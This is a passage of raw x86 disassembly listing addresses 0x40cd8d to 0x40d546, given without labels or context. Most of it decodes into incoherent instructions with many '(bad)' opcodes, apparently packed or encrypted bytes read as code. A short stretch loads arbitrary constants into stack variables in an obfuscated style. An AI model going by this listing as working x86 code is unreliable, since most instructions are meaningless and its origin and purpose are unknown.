  40cd8d:	not    DWORD PTR [esi+eax*1]
  40cd90:	popf   
  40cd91:	dec    ebx
  40cd92:	stc    
  40cd93:	fcomp  st(0)
  40cd95:	sti    
  40cd96:	mov    BYTE PTR [edx],ch
  40cd98:	pop    ss
  40cd99:	and    esp,ebp
  40cd9b:	and    bl,BYTE PTR [edx]
  40cd9d:	jmp    0x32f7:0x6862c2eb
  40cda4:	pop    es
  40cda5:	mov    edi,0x40b5c138
  40cdaa:	das    
  40cdab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdac:	mov    bl,BYTE PTR [ebx+0x6d]
  40cdaf:	sbb    edi,DWORD PTR [ebp+0x792c5923]
  40cdb5:	push   es
  40cdb6:	gs jo  0x40ce20
  40cdb9:	xchg   esi,eax
  40cdba:	jle    0x40cdfc
  40cdbc:	or     al,0xd3
  40cdbe:	adc    al,0x3d
  40cdc0:	and    DWORD PTR [ecx+0x15cef2c6],ecx
  40cdc6:	and    eax,DWORD PTR [edx]
  40cdc8:	adc    al,0x5
  40cdca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdcb:	mov    bl,0xb
  40cdcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdce:	mov    ah,0x23
  40cdd0:	sti    
  40cdd1:	xchg   esi,eax
  40cdd2:	enter  0xf18a,0xd9
  40cdd6:	pop    esp
  40cdd7:	cmp    ecx,0xe36db05d
  40cddd:	rcl    DWORD PTR [ebx-0x104cecd1],1
  40cde3:	dec    esi
  40cde4:	je     0x40cd69
  40cde6:	ror    BYTE PTR [esi+0x4e3891f7],1
  40cdec:	pop    ds
  40cded:	ror    DWORD PTR [esi],0x93
  40cdf0:	not    DWORD PTR [esi+ebx*2]
  40cdf3:	(bad)  
  40cdf5:	or     eax,0x75768a41
  40cdfa:	int3   
  40cdfb:	aam    0x4e
  40cdfd:	lods   eax,DWORD PTR ds:[esi]
  40cdfe:	dec    ecx
  40cdff:	adc    al,0x77
  40ce01:	push   ebp
  40ce02:	push   ecx
  40ce03:	std    
  40ce04:	outs   dx,BYTE PTR ds:[esi]
  40ce05:	daa    
  40ce06:	int    0xc8
  40ce08:	or     BYTE PTR [esi+0x3],dl
  40ce0b:	(bad)  
  40ce0c:	jmp    0x40cd8f
  40ce0e:	inc    ebp
  40ce0f:	pop    ss
  40ce10:	push   es
  40ce11:	inc    edi
  40ce12:	sbb    al,0x7f
  40ce14:	mov    ebp,0xfd3862eb
  40ce19:	out    0xea,eax
  40ce1b:	push   edi
  40ce1c:	stos   BYTE PTR es:[edi],al
  40ce1d:	inc    edx
  40ce1e:	js     0x40cdbc
  40ce20:	outs   dx,BYTE PTR ds:[esi]
  40ce21:	in     eax,dx
  40ce22:	jb     0x40cde3
  40ce24:	pop    ds
  40ce25:	add    BYTE PTR [eax-0x38],ch
  40ce28:	in     eax,0xfe
  40ce2a:	xchg   edi,eax
  40ce2b:	or     al,0x84
  40ce2d:	mov    eax,0x7629f31e
  40ce32:	test   BYTE PTR [ecx-0x17860043],0x8d
  40ce39:	gs popa 
  40ce3b:	icebp  
  40ce3c:	jne    0x40ceb8
  40ce3e:	loop   0x40ceb1
  40ce40:	jmp    0x40ceb6
  40ce42:	iret   
  40ce43:	lea    eax,[edi-0x4e]
  40ce46:	aad    0x71
  40ce48:	iret   
  40ce49:	nop
  40ce4a:	add    ebp,DWORD PTR [eax+edx*4]
  40ce4d:	or     dl,0x23
  40ce50:	add    eax,0xb2f16d17
  40ce55:	pmaxub mm5,mm0
  40ce58:	push   eax
  40ce59:	test   eax,0x987c9bb5
  40ce5e:	jnp    0x40ce0f
  40ce60:	or     al,0x1
  40ce62:	dec    edi
  40ce63:	jno    0x40ce28
  40ce65:	add    DWORD PTR [edx-0x1d],0x340b2bda
  40ce6c:	lock repnz mov cl,0x88
  40ce70:	fcom   DWORD PTR [edi+eax*4]
  40ce73:	int3   
  40ce74:	push   es
  40ce75:	aaa    
  40ce76:	and    eax,0x81e21bd2
  40ce7b:	sbb    ah,BYTE PTR [ebx+0x16ddfc56]
  40ce81:	push   esp
  40ce82:	fnsave [edi]
  40ce84:	fisttp QWORD PTR [ebx]
  40ce86:	mov    eax,ds:0x61f66127
  40ce8b:	mov    ecx,0x225c6c08
  40ce90:	(bad)  
  40ce91:	cmc    
  40ce92:	mov    eax,ds:0xedf6a36d
  40ce97:	cmp    esp,ecx
  40ce99:	jno    0x40ce1b
  40ce9b:	mov    ah,0xa2
  40ce9d:	test   al,0x9a
  40ce9f:	ins    BYTE PTR es:[edi],dx
  40cea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea1:	dec    ebp
  40cea2:	in     eax,0x6c
  40cea4:	(bad)  
  40cea5:	fldenv [ebp+0x1a259610]
  40ceab:	add    BYTE PTR [ebx],bh
  40cead:	jo     0x40ce49
  40ceaf:	aam    0x8e
  40ceb1:	aas    
  40ceb2:	pop    edx
  40ceb3:	push   di
  40ceb5:	(bad)  
  40ceb6:	call   0x66732092
  40cebb:	jb     0x40cec0
  40cebd:	call   0xe262:0xf370c0c6
  40cec4:	mov    ch,0x73
  40cec6:	inc    esi
  40cec7:	out    0x40,al
  40cec9:	jl     0x40cec6
  40cecb:	stos   DWORD PTR es:[edi],eax
  40cecc:	shl    DWORD PTR ds:0xfd2eee9,cl
  40ced2:	inc    ebp
  40ced3:	xor    ebx,eax
  40ced5:	cwde   
  40ced6:	mov    ch,0x7b
  40ced8:	sub    edi,DWORD PTR ds:0x6511122c
  40cede:	push   edx
  40cedf:	push   es
  40cee0:	sbb    bl,BYTE PTR [edx]
  40cee2:	leave  
  40cee3:	fdivr  st,st(3)
  40cee5:	mov    ds:0x756dd7d9,al
  40ceea:	in     al,dx
  40ceeb:	and    bh,BYTE PTR [eax]
  40ceed:	jle    0x40ce9a
  40ceef:	xchg   edx,eax
  40cef0:	push   edi
  40cef1:	jne    0x40cf69
  40cef3:	pop    esi
  40cef4:	dec    ebp
  40cef5:	lea    eax,[ebp+0x27da8752]
  40cefb:	out    0x19,eax
  40cefd:	(bad)  
  40cefe:	shr    DWORD PTR [bx+di],cl
  40cf01:	jb     0x40cee9
  40cf03:	mov    ebx,DWORD PTR [eax+0x12a171fc]
  40cf09:	jp     0x40cec4
  40cf0b:	int3   
  40cf0c:	imul   esi,DWORD PTR [esi+0x43c4cf35],0x51
  40cf13:	jnp    0x40cf39
  40cf15:	xor    ah,dh
  40cf17:	xlat   BYTE PTR ds:[ebx]
  40cf18:	fs add bl,0xc
  40cf1c:	jne    0x40cf54
  40cf1e:	adc    ch,ch
  40cf20:	fidiv  WORD PTR [ebx+0x49d7edc0]
  40cf26:	xchg   edx,eax
  40cf27:	or     edi,DWORD PTR [eax]
  40cf29:	dec    ebp
  40cf2a:	dec    ebp
  40cf2b:	test   ah,ah
  40cf2d:	std    
  40cf2e:	mov    WORD PTR [ebx+0x4713574a],cs
  40cf34:	mov    esi,0x1da77310
  40cf39:	xor    DWORD PTR [ecx-0x2290c9bf],eax
  40cf3f:	mov    DWORD PTR [ecx+ebx*1+0xa],ebx
  40cf43:	and    DWORD PTR [esp+edx*2],esi
  40cf46:	std    
  40cf47:	jg     0x40cf15
  40cf49:	dec    ecx
  40cf4a:	dec    ebx
  40cf4b:	stc    
  40cf4c:	cmp    DWORD PTR [edx+0x56da15c2],ebp
  40cf52:	push   ds
  40cf53:	arpl   WORD PTR [ebp-0x7169e246],si
  40cf59:	add    eax,0xb8e086bc
  40cf5e:	mov    esp,0xc5d64273
  40cf63:	mov    ebp,0xd116ab3e
  40cf68:	or     DWORD PTR [eax-0x70],esp
  40cf6b:	data16 cmp al,0x2d
  40cf6e:	sub    BYTE PTR [ecx-0x1f],cl
  40cf71:	and    al,BYTE PTR [esi+0x648342f0]
  40cf77:	fld    st(6)
  40cf79:	imul   ebp,DWORD PTR [ebx],0xffffffdb
  40cf7c:	mov    ebx,esi
  40cf7e:	xlat   BYTE PTR ds:[ebx]
  40cf7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf80:	inc    ecx
  40cf81:	fdiv   QWORD PTR [edi]
  40cf83:	push   ebp
  40cf84:	xchg   esp,eax
  40cf85:	xor    ebp,ecx
  40cf87:	sbb    ebp,DWORD PTR [edi*8-0x6c148f96]
  40cf8e:	mov    ebx,0x62fc4ef4
  40cf93:	call   0x28e74ad9
  40cf98:	mov    ah,0x6a
  40cf9a:	cld    
  40cf9b:	xor    BYTE PTR [esi+eax*2-0x1c],0x2e
  40cfa0:	outs   dx,BYTE PTR ds:[esi]
  40cfa1:	pop    ebx
  40cfa2:	jge    0x40cfe8
  40cfa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa5:	dec    edi
  40cfa6:	adc    al,bh
  40cfa8:	and    DWORD PTR [ebx],ebp
  40cfaa:	pop    ebx
  40cfab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfac:	push   edi
  40cfad:	jp     0x40cfc6
  40cfaf:	xor    al,0x97
  40cfb1:	imul   edi,ebp,0xd21f581a
  40cfb7:	or     al,0x92
  40cfb9:	xor    DWORD PTR es:[ebx],0x677628be
  40cfc0:	pop    edx
  40cfc1:	sub    eax,0xab5acbe0
  40cfc6:	mov    dl,0x9
  40cfc8:	inc    esp
  40cfc9:	leave  
  40cfca:	adc    eax,0x96e8a8c5
  40cfcf:	push   esi
  40cfd0:	mov    dh,0x5
  40cfd2:	lods   al,BYTE PTR ds:[esi]
  40cfd3:	sub    eax,0x4e5c6845
  40cfd8:	fldcw  WORD PTR [edi]
  40cfda:	sub    esp,DWORD PTR [ebx+0x33]
  40cfdd:	mov    esp,0xaa970343
  40cfe2:	add    BYTE PTR [ebx+edi*4],cl
  40cfe5:	lds    eax,FWORD PTR [ebp+0x73504cfd]
  40cfeb:	sub    eax,0xb8ba7a08
  40cff0:	mov    dl,BYTE PTR [ecx+0x6f]
  40cff3:	sub    eax,0x509745e1
  40cff8:	jne    0x40cfbe
  40cffa:	cmc    
  40cffb:	(bad)  
  40cffd:	sbb    eax,0xed496d60
  40d002:	adc    BYTE PTR [ecx],0x15
  40d005:	neg    BYTE PTR [edi+0x21]
  40d008:	mov    ds:0x12666c63,eax
  40d00d:	pop    esi
  40d00e:	inc    esi
  40d00f:	cmp    al,0x6d
  40d011:	shl    ebx,1
  40d013:	cmp    DWORD PTR [ebp+0x8950510],edi
  40d019:	test   DWORD PTR [ecx],esi
  40d01b:	retf   
  40d01c:	pushf  
  40d01d:	popf   
  40d01e:	or     BYTE PTR [ecx+0x5a],dl
  40d021:	fsubr  DWORD PTR [esi-0x2258f67e]
  40d027:	dec    eax
  40d028:	(bad)  
  40d029:	or     edi,ecx
  40d02b:	stos   BYTE PTR es:[edi],al
  40d02c:	lods   eax,DWORD PTR ds:[esi]
  40d02d:	jb     0x40d052
  40d02f:	aam    0xd1
  40d031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d032:	and    ah,dl
  40d034:	and    esi,eax
  40d036:	leave  
  40d037:	mov    cl,0xbc
  40d039:	pop    esp
  40d03a:	and    eax,0xb7efffbd
  40d03f:	xchg   ebp,eax
  40d040:	mov    al,ds:0x6fc04764
  40d045:	pop    es
  40d046:	push   esi
  40d047:	cmp    edx,DWORD PTR [ecx+edi*2-0x1b]
  40d04b:	(bad)
  40d04f:	add    eax,0xd530d1ef
  40d054:	sub    dh,al
  40d056:	pop    esp
  40d057:	test   DWORD PTR [ebx-0x6c],eax
  40d05a:	jb     0x40d078
  40d05c:	enter  0x96b2,0x1c
  40d060:	aam    0xde
  40d062:	sar    dl,0x1e
  40d065:	aad    0xb7
  40d067:	dec    edi
  40d068:	fist   WORD PTR [edi-0x7f983b8]
  40d06e:	xlat   BYTE PTR ds:[ebx]
  40d06f:	lea    ecx,[edx]
  40d071:	push   ds
  40d072:	cmp    edx,DWORD PTR [eax-0x7b95fd99]
  40d078:	mov    edi,0x85b6267e
  40d07d:	shl    DWORD PTR [esi],1
  40d07f:	in     al,0xa
  40d081:	scas   eax,DWORD PTR es:[edi]
  40d082:	dec    ebp
  40d083:	fiadd  WORD PTR [esi+0x106a98ba]
  40d089:	comiss xmm3,DWORD PTR cs:[ebx+0x4fe1ab07]
  40d091:	sbb    esi,DWORD PTR [edx+0x3]
  40d094:	lea    esi,[esi]
  40d096:	sbb    esi,DWORD PTR [ebp+0x70]
  40d099:	push   ebx
  40d09a:	mov    dh,0xc9
  40d09c:	sar    DWORD PTR [ecx-0x3cefacf8],cl
  40d0a2:	cmp    eax,0xf68792fa
  40d0a7:	sbb    bl,BYTE PTR [ebp+0x6b70f49b]
  40d0ad:	int    0xea
  40d0af:	mov    eax,0x5d00f674
  40d0b4:	dec    ecx
  40d0b5:	add    ah,bh
  40d0b7:	adc    al,0x4e
  40d0b9:	call   0x933e:0x4eec50ee
  40d0c0:	and    al,0x17
  40d0c2:	mov    es,ecx
  40d0c4:	ret    
  40d0c5:	dec    esp
  40d0c6:	iret   
  40d0c7:	stos   DWORD PTR es:[edi],eax
  40d0c8:	sahf   
  40d0c9:	sbb    esi,DWORD PTR [ecx]
  40d0cb:	popa   
  40d0cc:	push   edx
  40d0cd:	setbe  BYTE PTR [ecx-0x2d7c1fbb]
  40d0d4:	pop    edx
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	fldcw  WORD PTR [eax-0x7a]
  40d1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ae:	xchg   ecx,eax
  40d1af:	out    0xbe,eax
  40d1b1:	mov    esi,0xbebec492
  40d1b6:	out    0x50,eax
  40d1b8:	out    0x91,eax
  40d1ba:	xlat   BYTE PTR ds:[ebx]
  40d1bb:	add    al,0xb0
  40d1bd:	pop    ds
  40d1be:	jo     0x40d21c
  40d1c0:	push   eax
  40d1c1:	cmp    eax,0x6d46bfdb
  40d1c6:	cmp    BYTE PTR [eax],dl
  40d1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1c9:	lea    esi,ds:0xd81f0104
  40d1cf:	jge    0x40d1aa
  40d1d1:	(bad)  
  40d1d2:	jbe    0x40d15b
  40d1d4:	mov    eax,0xd8414a86
  40d1d9:	gs clc 
  40d1db:	(bad)  
  40d1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1de:	xor    eax,0x40a08291
  40d1e3:	push   ebp
  40d1e4:	enter  0xb8f8,0xbd
  40d1e8:	xor    esi,DWORD PTR [edx]
  40d1ea:	gs int3 
  40d1ec:	mov    esp,0x43259613
  40d1f1:	sti    
  40d1f2:	pop    esp
  40d1f3:	mov    ch,0x13
  40d1f5:	dec    ebp
  40d1f6:	sbb    dh,BYTE PTR [edi]
  40d1f8:	xchg   edi,eax
  40d1f9:	in     eax,0x31
  40d1fb:	sub    DWORD PTR [esi+0x20f0172d],0xffffffcb
  40d202:	pop    edi
  40d203:	push   es
  40d204:	jg     0x40d219
  40d206:	sub    al,0xe9
  40d208:	call   0x51b0:0xaca22a0a
  40d20f:	cmp    DWORD PTR [ebx+0x78],0xc3a9627
  40d216:	adc    al,BYTE PTR [esp+edi*4]
  40d219:	sbb    al,0x27
  40d21b:	aam    0xc
  40d21d:	sub    edx,DWORD PTR [ecx+0x21]
  40d220:	cwde   
  40d221:	and    DWORD PTR [ebx],ebx
  40d223:	aas    
  40d224:	sbb    al,0xb
  40d226:	(bad)  
  40d228:	aaa    
  40d229:	test   DWORD PTR [esi+0x658a9a54],0x79d7d016
  40d233:	cmc    
  40d234:	ss mov bh,0x85
  40d237:	mov    cl,0x12
  40d239:	stc    
  40d23a:	fisttp QWORD PTR [ecx]
  40d23c:	dec    ecx
  40d23d:	sahf   
  40d23e:	lods   eax,DWORD PTR cs:[esi]
  40d240:	out    dx,al
  40d241:	neg    BYTE PTR [ecx]
  40d243:	(bad)  
  40d244:	mov    ecx,0x9a654c0e
  40d249:	and    BYTE PTR [esi+0x4afc5374],bh
  40d24f:	outs   dx,BYTE PTR ds:[esi]
  40d250:	inc    edx
  40d251:	or     DWORD PTR [ebp-0x4d],esi
  40d254:	dec    edi
  40d255:	jle    0x40d27b
  40d257:	in     al,dx
  40d258:	add    eax,0x670774fa
  40d25d:	xchg   ecx,eax
  40d25e:	icebp  
  40d25f:	jg     0x40d262
  40d261:	adc    bl,BYTE PTR ds:0xf64c41d0
  40d267:	inc    eax
  40d268:	fmul   st,st(0)
  40d26a:	fild   QWORD PTR [ebx+0x25]
  40d26d:	xchg   esp,eax
  40d26e:	push   eax
  40d26f:	mov    BYTE PTR [edi-0x573d0f99],dl
  40d275:	push   0x24418582
  40d27a:	and    eax,0x8107f96c
  40d27f:	inc    ebp
  40d280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d281:	daa    
  40d282:	mov    esi,0x83e109e7
  40d287:	(bad)  
  40d288:	dec    edi
  40d289:	inc    edi
  40d28a:	or     DWORD PTR [esi-0x6b06b30d],esp
  40d290:	ss dec edx
  40d292:	fdivr  QWORD PTR [edx]
  40d294:	and    edx,DWORD PTR [ebp+0x25]
  40d297:	sti    
  40d298:	leave  
  40d299:	and    al,0xff
  40d29b:	adc    al,0x89
  40d29d:	int    0xd0
  40d29f:	int3   
  40d2a0:	mov    DWORD PTR [esi],edi
  40d2a2:	retf   0xe22d
  40d2a5:	sbb    eax,0x95beb93f
  40d2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ab:	push   esi
  40d2ac:	adc    al,0x42
  40d2ae:	aas    
  40d2af:	and    BYTE PTR [edi+ecx*1],bh
  40d2b2:	test   BYTE PTR [eax+0x3a6ed065],bh
  40d2b8:	sbb    eax,0x41f4cd10
  40d2bd:	test   eax,0xd2bd29fd
  40d2c2:	nop
  40d2c3:	pop    ebp
  40d2c4:	pop    ecx
  40d2c5:	cmp    esp,ebp
  40d2c7:	cmc    
  40d2c8:	outs   dx,BYTE PTR ds:[esi]
  40d2c9:	out    dx,al
  40d2ca:	aam    0x6b
  40d2cc:	popa   
  40d2cd:	fidiv  DWORD PTR [edi+0x5e6347e7]
  40d2d3:	fcomp  QWORD PTR [ecx]
  40d2d5:	out    dx,al
  40d2d6:	push   ecx
  40d2d7:	sub    DWORD PTR [eax+0x5c4c900a],eax
  40d2dd:	or     ch,BYTE PTR [edx-0xe]
  40d2e0:	jae    0x40d310
  40d2e2:	add    DWORD PTR [eax-0x1e7408a7],0x4c
  40d2e9:	jns    0x40d35c
  40d2eb:	xchg   esp,eax
  40d2ec:	and    edx,DWORD PTR [esi]
  40d2ee:	aam    0xa4
  40d2f0:	mov    eax,ds:0xa2b6427a
  40d2f5:	fbstp  TBYTE PTR [esi]
  40d2f7:	out    dx,eax
  40d2f8:	inc    edx
  40d2f9:	sub    dl,BYTE PTR [ebx+0x46927251]
  40d2ff:	sub    DWORD PTR [edi+0xf25460a],edi
  40d305:	pop    edi
  40d306:	lds    eax,FWORD PTR [edx+0x49]
  40d309:	xchg   BYTE PTR [edi-0x56cf5dfa],ah
  40d30f:	fisub  DWORD PTR [ebx+ebx*1]
  40d312:	fst    QWORD PTR [ecx-0x64cd03ac]
  40d318:	cmp    eax,0x9c2cd415
  40d31d:	popf   
  40d31e:	inc    esp
  40d31f:	lods   eax,DWORD PTR ds:[esi]
  40d320:	shr    DWORD PTR [eax+eiz*8-0x489e4dff],0xf0
  40d328:	jmp    FWORD PTR fs:[esi]
  40d32b:	mov    cl,0x86
  40d32d:	dec    edx
  40d32e:	jle    0x40d2eb
  40d330:	ja     0x40d31b
  40d332:	iret   
  40d333:	fistp  QWORD PTR [eax+0x41]
  40d336:	bnd ja 0x40d364
  40d339:	stos   BYTE PTR es:[edi],al
  40d33a:	leave  
  40d33b:	lds    ebp,FWORD PTR [eax+0x6c59e0f8]
  40d341:	mov    cl,bl
  40d343:	loopne 0x40d2f1
  40d345:	fbstp  TBYTE PTR [ecx+0x52456f57]
  40d34b:	mov    esi,0xb92c73d6
  40d350:	push   esp
  40d351:	sub    al,0x32
  40d353:	shl    DWORD PTR [eax-0x22],cl
  40d356:	adc    dh,BYTE PTR [eax-0x31]
  40d359:	aad    0x73
  40d35b:	jbe    0x40d3b8
  40d35d:	mov    cl,0xbb
  40d35f:	retf   
  40d360:	cmp    eax,0xcd5845cc
  40d365:	retf   
  40d366:	(bad)  
  40d367:	pop    ebx
  40d368:	cs leave 
  40d36a:	fisttp DWORD PTR [edi-0x3dccda11]
  40d370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d371:	icebp  
  40d372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d373:	imul   DWORD PTR [edi-0x79201f07]
  40d379:	add    cl,BYTE PTR [edx-0x7e45dc15]
  40d37f:	xor    ebp,ecx
  40d381:	mov    bh,0x8d
  40d383:	adc    BYTE PTR [esi+0x1b],dl
  40d386:	daa    
  40d387:	mov    edi,0x3db6de54
  40d38c:	add    BYTE PTR [edi+0x5b],al
  40d38f:	arpl   WORD PTR [ecx+0x3c],sp
  40d392:	cmp    ebx,DWORD PTR [edx]
  40d394:	sub    BYTE PTR [ebx],0xa3
  40d397:	xchg   ebp,eax
  40d398:	clc    
  40d399:	sbb    al,0x44
  40d39b:	shl    BYTE PTR [ecx-0x2d2e7ab],1
  40d3a1:	loope  0x40d40f
  40d3a3:	in     al,0x30
  40d3a5:	dec    ebx
  40d3a6:	mov    ch,0x10
  40d3a8:	in     al,0x4b
  40d3aa:	inc    esi
  40d3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ac:	lahf   
  40d3ad:	mov    ah,0x8e
  40d3af:	and    DWORD PTR [edx],eax
  40d3b1:	push   0xeeb8b271
  40d3b6:	aaa    
  40d3b7:	pop    ds
  40d3b8:	lea    ecx,[ebp+0x2fbd4a4d]
  40d3be:	or     ecx,DWORD PTR [ecx]
  40d3c0:	cld    
  40d3c1:	push   ebp
  40d3c2:	(bad)  
  40d3c5:	enter  0x1ea9,0xfb
  40d3c9:	enter  0xebc9,0x24
  40d3cd:	xchg   ebx,eax
  40d3ce:	sbb    BYTE PTR [edi+0x3b],ah
  40d3d1:	mov    WORD PTR [edi+eiz*8+0x65],ss
  40d3d5:	mov    cl,0x0
  40d3d7:	jb     0x40d456
  40d3d9:	pop    ebp
  40d3da:	mov    ah,0x46
  40d3dc:	fimul  DWORD PTR [ecx-0x13]
  40d3df:	sub    eax,0xcdc977f6
  40d3e4:	pusha  
  40d3e5:	sub    al,0xdc
  40d3e7:	bound  edi,QWORD PTR ds:0xe5b2bf7d
  40d3ed:	cmp    al,0xf8
  40d3ef:	mov    eax,ds:0x7dbc3583
  40d3f4:	cwde   
  40d3f5:	xchg   ebx,eax
  40d3f6:	rcr    BYTE PTR [eax],cl
  40d3f8:	bound  ebp,QWORD PTR [edi]
  40d3fa:	in     al,dx
  40d3fb:	test   esi,esi
  40d3fd:	jmp    0x6635:0x73c98699
  40d404:	test   bl,ch
  40d406:	add    eax,0x5cd6825f
  40d40b:	sbb    dl,BYTE PTR [edi-0x3d]
  40d40e:	sbb    BYTE PTR [ebp-0x63],dh
  40d411:	push   0x5d
  40d413:	add    eax,DWORD PTR [esi+0x9]
  40d416:	mov    esp,0x94a7124f
  40d41b:	fwait
  40d41c:	test   BYTE PTR [esi+edi*4-0x5e],bl
  40d420:	mov    ah,0x27
  40d422:	dec    edx
  40d423:	retf   
  40d424:	add    edi,eax
  40d426:	jb     0x40d47f
  40d428:	jmp    0x53c232c1
  40d42d:	mov    ds:0x9371e068,eax
  40d432:	pop    es
  40d433:	adc    eax,DWORD PTR [edi+ebx*8-0x3c3a972e]
  40d43a:	pop    esi
  40d43b:	fcomp  QWORD PTR [ebp+0x11]
  40d43e:	iret   
  40d43f:	sub    DWORD PTR [ebx+esi*8],0xffffff8d
  40d443:	inc    edi
  40d444:	xor    edi,esi
  40d446:	sub    DWORD PTR [edi-0x52],ebp
  40d449:	lahf   
  40d44a:	mov    ch,0x60
  40d44c:	adc    bh,BYTE PTR [edi-0x6f]
  40d44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d450:	mov    al,0x61
  40d452:	xor    al,0xf3
  40d454:	jl     0x40d48e
  40d456:	sub    eax,0x2ece31d9
  40d45b:	ja     0x40d464
  40d45d:	ret    0x98c
  40d460:	push   edx
  40d461:	ret    0x3f74
  40d464:	fiadd  DWORD PTR [edi-0x69]
  40d467:	xchg   esp,eax
  40d468:	adc    eax,0x3ee2d8a6
  40d46d:	dec    ebp
  40d46e:	mov    esi,0x4b47f66a
  40d473:	sub    eax,0xec582b8c
  40d478:	sbb    esi,DWORD PTR [ecx-0x1b]
  40d47b:	pop    edx
  40d47c:	dec    edi
  40d47d:	push   ebx
  40d47e:	jo     0x40d464
  40d480:	imul   esp,DWORD PTR [edx+0x3b2f9b33],0xf6f45764
  40d48a:	xchg   ebp,eax
  40d48b:	sub    eax,0x8f92662b
  40d490:	dec    eax
  40d491:	in     al,dx
  40d492:	jmp    0xd470:0x5e8507f
  40d499:	dec    esp
  40d49a:	jne    0x40d470
  40d49c:	cmp    eax,0x7dcdad10
  40d4a1:	add    eax,0xd0df7686
  40d4a6:	pop    ss
  40d4a7:	or     DWORD PTR [ebp+eiz*8-0x36],ecx
  40d4ab:	cmp    eax,DWORD PTR [edi]
  40d4ad:	rol    BYTE PTR [eax+0x57],0x58
  40d4b1:	xor    edx,DWORD PTR [ebx-0x57ef5705]
  40d4b7:	test   al,0x91
  40d4b9:	repz std 
  40d4bb:	loope  0x40d50b
  40d4bd:	daa    
  40d4be:	xchg   ax,ax
  40d4c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4c1:	(bad)  
  40d4c2:	pop    es
  40d4c3:	dec    edx
  40d4c4:	imul   edx,DWORD PTR [edi+0x7620be5],0x2ee3d70
  40d4ce:	and    ebp,ebx
  40d4d0:	aam    0x88
  40d4d2:	idiv   DWORD PTR [ebp-0x6ffc81d8]
  40d4d8:	dec    ebx
  40d4d9:	xchg   edi,eax
  40d4da:	xor    BYTE PTR [ebx],bh
  40d4dc:	retf   
  40d4dd:	mov    ebx,0xb89db296
  40d4e2:	addr16 sti 
  40d4e4:	icebp  
  40d4e5:	popf   
  40d4e6:	test   al,0x12
  40d4e8:	jns    0x40d4e9
  40d4ea:	jg     0x40d4c0
  40d4ec:	xor    DWORD PTR ds:0xb247c80c,esp
  40d4f2:	cld    
  40d4f3:	cmp    DWORD PTR [eax-0x4b5be74c],edx
  40d4f9:	enter  0x188,0x39
  40d4fd:	fstp   QWORD PTR [ebx-0xc]
  40d500:	pop    edi
  40d501:	mov    eax,0x7204ff45
  40d506:	and    DWORD PTR [ebp-0x3202a59e],esi
  40d50c:	and    ah,BYTE PTR [ebp+0x1f]
  40d50f:	ja     0x40d496
  40d511:	cmp    BYTE PTR [ecx-0x7abae08a],cl
  40d517:	add    al,0x3
  40d519:	je     0x40d4f6
  40d51b:	adc    ecx,DWORD PTR [edx+0x1a]
  40d51e:	retf   0x6223
  40d521:	push   ebp
  40d522:	push   es
  40d523:	popf   
  40d524:	fsub   DWORD PTR [eax]
  40d526:	jns    0x40d541
  40d528:	pop    edi
  40d529:	pusha  
  40d52a:	push   0x275b0389
  40d52f:	mov    eax,0x2dc45d7e
  40d534:	ror    DWORD PTR [ecx-0x6157ca55],0xc0
  40d53b:	mov    edx,0x78ac3893
  40d540:	ja     0x40d4cf
  40d542:	pushf  
  40d543:	inc    edx
  40d544:	push   es
  40d545:	ins    DWORD PTR es:[edi],dx
  40d546:	ins    BYTE PTR es:[edi],dx
